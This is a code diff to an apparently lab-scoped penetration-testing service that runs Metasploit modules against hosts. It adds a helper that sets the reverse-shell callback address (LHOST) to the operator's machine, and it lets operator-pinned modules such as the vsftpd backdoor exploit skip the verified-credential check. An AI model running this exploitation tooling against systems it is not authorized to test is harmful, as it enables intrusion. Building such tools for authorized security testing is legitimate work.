@@ -3,6 +3,7 @@
 # optional session). Runs ONLY against authorized lab targets, and ONLY when a
 # scan explicitly enables it.
 import logging
+import socket
 from collections.abc import Callable
 from typing import Any
 
@@ -10,6 +11,25 @@ from schemas import AttackRequest
 from services.msfrpc import MsfClient
 
 logger = logging.getLogger("h4k.attack")
+
+
+def _local_ip() -> str | None:
+    """Source IP chosen by the routing table for outbound traffic.
+
+    UDP connect doesn't send packets; it just consults the routing table, so
+    this is side-effect free and gives the address a reverse-shell payload
+    must call back to. Never the target's address.
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            sock.connect(("8.8.8.8", 80))
+            return sock.getsockname()[0]
+        finally:
+            sock.close()
+    except OSError:
+        return None
+
 
 # Fallback static mapping when dynamic discovery is unavailable
 STATIC_SERVICE_MODULES: dict[str, str] = {
@@ -61,13 +81,20 @@ class AttackService:
         hosts = self._resolve_hosts(req)
         for host in hosts:
             for svc in self._resolve_services(req, host):
+                pinned = bool(req.module)
                 module = req.module or self._dynamic_module_for_service(svc)
                 if not module:
                     continue
                 cred = cred_idx.get((host, svc.lower()))
                 self.progress(f"attacking {host} {svc} via {module}", 0)
                 res = self._try_exploit(
-                    module, host, svc, req.open_sessions, cred=cred, port=req.port
+                    module,
+                    host,
+                    svc,
+                    req.open_sessions,
+                    cred=cred,
+                    port=req.port,
+                    pinned=pinned,
                 )
                 attacks.append(
                     {
@@ -143,11 +170,14 @@ class AttackService:
         open_sessions: bool,
         cred: dict[str, str] | None = None,
         port: int | None = None,
+        pinned: bool = False,
     ) -> dict:
         """Set sensible per-module options (only valid ones) and execute.
 
         Only RHOSTS (and RPORT) are set unconditionally. Credential-driven
-        exploits (ssh/tomcat/ftp) only run when a verified cred is supplied.
+        exploits (ssh/tomcat/ftp) only run when a verified cred is supplied —
+        EXCEPT when the operator pinned the module from a vulnerability triage
+        (pinned=True), which is an explicit, deliberate choice.
         An operator-supplied port (from a triaged finding) beats the guess.
         """
         valid = self._module_options(module)
@@ -155,15 +185,21 @@ class AttackService:
         if "RPORT" in valid:
             opts["RPORT"] = port or self._port_for(svc)
         if "LHOST" in valid:
-            opts["LHOST"] = host
+            # payload callback address MUST be us, never the victim
+            lhost = _local_ip()
+            if lhost:
+                opts["LHOST"] = lhost
         if "LPORT" in valid:
             opts["LPORT"] = 4444
 
-        # Credential-driven modules (ssh/tomcat/ftp) need a verified cred.
+        # Credential-implicit modules (ssh/tomcat/ftp-family) only run when a
+        # verified cred exists — for heuristic/auto attacks. An operator-pinned
+        # module from a triage card is an explicit choice and runs as asked
+        # (e.g. vsftpd_234_backdoor needs no credential).
         cred_user = cred.get("user") if cred else None
         cred_pass = cred.get("password") if cred else None
         needs_cred = any(m in module for m in ("ssh", "tomcat", "vsftpd"))
-        if needs_cred and not (cred_user and cred_pass):
+        if needs_cred and not (cred_user and cred_pass) and not pinned:
             return {
                 "ok": False,
                 "detail": "credential-driven module; no verified cred to try",
